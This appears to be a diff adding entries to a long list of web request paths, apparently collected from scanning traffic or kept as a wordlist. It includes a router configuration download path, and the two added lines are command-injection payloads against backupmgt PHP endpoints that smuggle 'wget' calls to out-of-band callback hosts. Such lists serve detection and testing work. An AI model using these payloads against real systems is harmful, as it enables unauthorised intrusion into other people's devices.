@@ -30926,3 +30926,5 @@ http://64.233.170.113/
 /?srsltid=AfmBOorPwyfHYvTKm8uM8SnenxB-JNavQYD_kboWxDu7tPJpxQeIsOv3
 /?gad_source=5&gad_campaignid=21979123179&gclid=EAIaIQobChMI3o31m7CWjgMV9Fn2CB3MZTZSEAEYASAAEgIjZ_D_BwE
 /cgi-bin/DownloadCfg/RouterCfm.cfg
+/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d1g6fujpu1sm2rahe0kg8eb7cxh8m9zbm.oast.site;
+/backupmgt/localJob.php?session=fail;wget+http://d1g6fujpu1sm2rahe0kgotaaighsxxijh.oast.site;
